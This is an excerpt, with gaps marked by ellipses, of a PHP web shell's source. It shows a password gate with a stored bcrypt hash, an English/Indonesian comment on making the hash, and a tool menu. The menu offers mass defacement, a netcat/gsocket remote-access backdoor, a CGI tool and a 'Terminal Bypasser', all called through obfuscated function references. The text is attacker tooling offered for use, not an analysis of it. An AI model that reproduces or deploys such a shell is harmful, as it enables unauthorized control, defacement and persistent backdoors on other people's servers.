...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$bKxdqdftenawmDDxVAdJ1Os/HLGljY4tzLZ7sfYXwDX8psuEPbNie'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li class="logo-gecko"><img width="400" height="400" src="gecko1.png" align="right"></li>
    ...
    <div class="menu-tools">
        <ul>
            ...
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&cgipro" class="btn-submit"><i class="fa-solid fa-display"></i> CGI PRO</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&massfile" class="btn-submit"><i class="fa-solid fa-wand-magic-sparkles"></i> MASS DEFACE</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&gsocket" class="btn-submit badge-linux"><i class="fa-brands fa-hive"></i> NC GSOCKET</a></li>
            <li><a href="" class="btn-submit"><i class="fa-solid fa-terminal"></i> Terminal Bypasser</a></li>
            ...
            <li><a href="" class="btn-submit"><i class="fa-solid fa-right-from-bracket"></i> LOGOUT</a></li>
        </ul>
    </div>
